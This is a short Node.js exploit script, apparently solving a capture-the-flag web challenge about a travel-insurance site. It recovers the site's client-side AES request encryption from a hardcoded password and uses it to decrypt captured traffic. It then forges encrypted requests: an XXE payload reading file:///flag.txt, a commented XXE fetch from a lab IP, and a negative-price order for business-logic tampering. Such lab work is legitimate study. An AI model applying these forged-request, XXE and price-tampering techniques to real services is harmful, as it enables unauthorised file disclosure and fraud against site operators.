const CryptoJS = require('crypto-js')
function toBase64String(words){
  return CryptoJS.enc.Base64.stringify(words);
}
const MASTER_PASSWORD = 'InsureYourTravel'
function decrypt(data) {
  data = CryptoJS.enc.Base64.parse(data)
  var G = CryptoJS.lib.WordArray.create(data.words.slice(0, 4))
  var iv = CryptoJS.lib.WordArray.create(data.words.slice(4, 8))
  var ciphertext = CryptoJS.lib.WordArray.create(data.words.slice(8))
  key = CryptoJS.PBKDF2(MASTER_PASSWORD, G, {
    keySize: 8,
    iterations: 100
  });
  ciphertext = toBase64String(ciphertext);

  var D = CryptoJS.AES.decrypt(ciphertext, key, {
    iv: iv
  }).toString(CryptoJS.enc.Utf8)
  // return D
  console.log(D)
}
function encrypt(data) {
  var G = CryptoJS.lib.WordArray.random(16);
  key = CryptoJS.PBKDF2(MASTER_PASSWORD, G, {
    keySize: 8,
    iterations: 100
  });
  var iv = CryptoJS.lib.WordArray.random(16);
  var I = CryptoJS.AES.encrypt(data, key, {
    iv: iv,
    padding: CryptoJS.pad.Pkcs7,
    mode: CryptoJS.mode.CBC
  });

  console.log(CryptoJS.enc.Base64.stringify(G.concat(iv).concat(I.ciphertext)));
}
encrypt('{"format":"json","data":{"countries":["Alaban"],"startdate":"2023-08-26","enddate":"2023-07-26","resttype":2}}')
// decrypt(encrypt('{"format":"json","data":{"countries":["Alaban"],"startdate":"2023-08-26","enddate":"2023-07-26","resttype":2}}'))
decrypt("ME7XJT4x7XBpBBKR0e3ioIiZMCmfXlOCCMxtVun/nwO7KEL/FqZZqsEc2mJMqMxGIRsEG7xlyahNFJnZpjLuJSgJR+e/T3rT0zSISVjOVLl7lFWpD20dK7Yf4KGP1FItvEeCvi32Z3b7QInw7yew1fN9vcJBQOpp4YrAY535a5JJpgPic0DymuEsWlHfH3Lle6PUaDDi2G4m0MzPwJ0DY9lvu9jApxnsoNRhc4xe80hoKUE6dWjgzW7tXNS9PSMG3/KpS0lNlHh4sjk+Txz/syve/MzRD/IteookFf3suSag5c/xHt0B4+6bJwjukWU87h68nESf1O6JCTq45mpAylJ5CBRiBj5kIk5+HzKhpUFU1wpfwNFoDcDwtWvZWzaxwI3nng8evrwP+dVSHKhdZgL0VqXPXvJazqQxnmO0VeUiZVNk1GNPZ0rqNGVnRWHq")
decrypt("8FoWMwrlbNtyykMb2JcnoNhPZDA1J+Ulk5deTC9kgbNNZ79lCMGYFwxB9r/3RohWOYxm3akka++/38zqjP1Z+aB4dcUF7y8mhdkTTYFZECGu6u6XDk8xl+8P1GErxMKB8nqdmg07/iivbdf7oWctCrO131lVvoPFnHrTcCAtJKuP0z2MZ4BgtgIwRA46J3/vxrx+xxgidDKjUC67tKx/ZoQvqN+pUAegEJmsgHIF9r4=")
encrypt('{"format":"xml","data":"<!DOCTYPE data[<!ENTITY xxe SYSTEM \'file:///flag.txt\' >]><data><countries></countries><startdate></startdate><enddate></enddate><resttype></resttype><xxe>&xxe;</xxe></data>"}')
//<?xml version="1.0" encoding="UTF-8"?>
//<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://10.10.9.10:8080/flag.txt" >]>
decrypt('yCuwWWesj2JVG7OVUsOVvgFL3t0HkLr+Fj/zsyYC8XaY6uJ9lMrqz4A8f5GaTaiewneP8MHnGKJyniW8SGR2icgL1sZeIbWFqs4+E2IAeAMIxXCfI+CiIiJRsSu1R2ZwxQ4pZCjkqh4NuQhJla3ki3c/8qxBQ1iz+3V8bWivUvNUB7qPrHgP/yxsv+kpwt/+YlbucuEf75iz5+U+0XtKzZkoFNHF1LSwQdaHwwRe2RVliDEL6xbKlPfRpkhjN0Gbz9ZCylvzNcFagFFswJliwyUC3+yADLBjCywS16lYGbZEopRI7Crq4d8H81pvmJ0SFPRi9iwxUiEs5EK+oHWe5G90CpBbjdNPH5PWxCg50PZuNNAA/opNO4nLpLMjqpjXda/EbOjk5Fdi02Rx3uGkOO01JCWK2gm69AWbs/Y3PHY=')
encrypt('{"format":"xml","data":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<data>\n  <countries>\n    <element>Alaban</element>\n  </countries>\n  <startdate>2023-08-26</startdate>\n  <enddate>2023-07-26</enddate>\n  <resttype>2</resttype>\n  <price>-4000</price>\n</data>\n"}')